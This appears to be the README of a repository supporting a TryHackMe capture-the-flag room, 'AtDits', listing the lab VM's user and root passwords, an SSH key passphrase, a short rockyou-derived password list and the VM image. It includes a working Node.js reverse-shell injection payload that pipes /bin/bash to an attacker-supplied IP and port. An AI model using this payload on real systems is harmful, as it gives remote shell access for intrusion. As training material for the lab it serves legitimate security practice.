# thm_atdits
This repository holds or links to all the files needed to complete or recreate the TryHackMe room [AtDits](https://tryhackme.com/jr/atdits).

## Login Data for the VM
>User: paul  
>Password: SicheresPasswort

>User: root  
>Password: IchMagZuege!

>[Private Key](VM-Key/id_rsa) Passphrase  
>felix1


## Injection params for netcat
```
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
## Short password list

The short [password list](passwordlist/rockyou.txt) is a list of around 200 passwords from the rockyou.txt list.  
It holds also the passophrase for the private key.

## VM
The VM is a Ubuntu Server 20.04 Image.  
It is in the `.ova` format and can be directly uploaded to TryHackMe.

File: [VM.ova]()